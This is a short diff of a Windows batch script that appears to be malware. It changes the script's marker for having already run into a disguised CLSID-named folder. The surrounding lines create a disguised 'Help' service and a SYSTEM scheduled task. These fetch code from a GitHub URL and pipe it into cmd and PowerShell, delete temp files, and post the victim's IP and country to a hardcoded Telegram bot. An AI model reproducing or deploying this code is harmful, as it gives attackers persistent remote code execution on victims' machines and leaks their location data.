@@ -13,7 +13,7 @@ sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercont
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc minute /mo 40 /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/1/ps | cmd /Q /V:ON" /F
 del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
 
-if exist "%ProgramData%\sent" exit /b
+if exist "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" exit /b
 chcp 65001 >nul
 set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
 set "CHAT_ID=-4955395962"
@@ -26,5 +26,5 @@ for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-ap
 )
 
 %WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=TRF1%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
-echo done > "%ProgramData%\sent"
+mkdir "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
 endlocal
